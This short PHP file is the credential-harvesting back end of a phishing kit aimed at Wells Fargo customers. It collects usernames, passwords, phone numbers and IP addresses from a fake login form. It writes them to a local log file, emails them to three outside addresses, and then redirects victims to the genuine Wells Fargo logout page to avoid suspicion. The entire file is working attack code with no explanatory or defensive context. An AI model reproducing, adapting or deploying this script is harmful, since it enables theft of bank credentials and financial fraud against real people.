﻿﻿   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ WELLSFARGO LOGS +-----------connect---\n";
$message .= "username: ".$_POST['j_username']."\n";
$message .= "password: ".$_POST['j_password']."\n";
$message .= "username: ".$_POST['j_username']."\n";
$message .= "password: ".$_POST['j_password']."\n";
$message .= "phonenumber: ".$_POST['phonenumber']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Authur-----------------\n";
$send = "docinhere@proton.me,docinhere@yandex.com,docinhere0001@gmail.com";
$fp = fopen("A1R.txt","a");
fputs($fp,$message);
fclose($fp);
$subject = "A1R";
$headers = "iWeLLs";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
echo "<meta http-equiv='Refresh' content='0;URL=https://connect.secure.wellsfargo.com/auth/secureLogout?st=1534888581&SAMLart=AAQCBeoEQCR14WDgSxaU4QNGCHpGcoS1aUFjKPOTaCWmJOTNXgipbB3D9TA%3D'>";
	  

?>